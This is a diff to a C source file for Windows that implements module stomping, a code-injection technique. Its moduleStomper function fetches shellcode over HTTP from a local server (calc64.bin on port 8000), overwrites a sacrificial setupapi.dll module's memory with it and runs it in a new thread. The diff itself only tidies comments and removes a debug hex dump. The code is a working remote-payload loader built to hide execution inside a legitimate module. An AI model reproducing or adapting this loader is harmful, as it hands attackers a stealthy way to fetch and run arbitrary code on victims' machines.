@@ -1,5 +1,5 @@
 #include <stdio.h>
-#include <Windows.h>
+#include <windows.h>
 
 
 #define		SACRIFICIAL_DLL			"setupapi.dll"
@@ -25,22 +25,13 @@ BOOL WritePayload(IN PVOID pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize) 
 
 void moduleStomper() {
     unsigned char* payload = NULL;
-    DWORD size = 0;  // Changed to DWORD to match the fetchCode function
+    DWORD size = 0;
 
     int result = fetchCode(L"localhost", L"/calc64.bin", 8000, &payload, &size);
     if (result != 0) {
         printf("[-] Failed to fetch shellcode with error code %d\n", result);
-        return;  // Changed to return; as the function is void
+        return;
     }
-
-    printf("[+] Received shellcode...\n");
-    for (int i = 0; i < size; ++i) {
-        printf("%02x ", payload[i]);
-        if ((i + 1) % 16 == 0) {
-            printf("\n");
-        }
-    }
-    printf("\n");
 
     PVOID		pAddress = NULL;
     HMODULE		hModule = NULL;
@@ -58,7 +49,7 @@ void moduleStomper() {
         return;
     }
 
-    if (!WritePayload(pAddress, payload, size)) {  // Used size instead of sizeof(payload)
+    if (!WritePayload(pAddress, payload, size)) {
         return;
     }
 
@@ -66,6 +57,6 @@ void moduleStomper() {
     if (hThread != NULL)
         WaitForSingleObject(hThread, INFINITE);
 
-    // Free the payload when you're done
+
     free(payload);
 }
